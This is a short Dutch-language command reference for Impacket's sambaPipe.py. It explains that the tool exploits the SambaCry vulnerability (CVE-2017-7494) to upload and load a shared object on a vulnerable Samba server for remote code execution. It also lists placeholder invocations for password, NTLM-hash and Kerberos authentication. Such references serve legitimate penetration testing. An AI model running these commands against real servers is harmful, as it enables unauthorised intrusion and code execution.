# sambapipe.py

Misbruik CVE-2017-7494 (SambaCry) om een SO-bestand (shared object) te uploaden en laden op een kwetsbare Samba-server om code op afstand uit te voeren. Onderdeel van de Impacket-suite.

## Usage
- `sambaPipe.py -so pad/naar/bestand.so domein/gebruikersnaam:wachtwoord@doel` : upload een gedeeld objectbestand en laad op een kwetsbare Samba-server
- `sambaPipe.py -so pad/naar/bestand.so -hashes LM_HASH:NT_HASH domein/gebruikersnaam:wachtwoord@doel` : authenticeer met NTLM hashes in plaats van een wachtwoord
- `sambaPipe.py -so pad/naar/bestand.so -k -no-pass domein/gebruikersnaam:wachtwoord@doel` : gebruik Kerberos verificatie voor het doel
- `sambaPipe.py -so pad/naar/bestand.so -dc-ip dc_ip domein/gebruikersnaam:wachtwoord@doel` : specificeer een domeincontroller-IP voor authenticatie
- `sambaPipe.py -so pad/naar/bestand.so -port poort domein/gebruikersnaam:wachtwoord@doel` : gebruik een aangepaste poort voor de SMB-verbinding

## Links
- More information: https://github.com/fortra/impacket
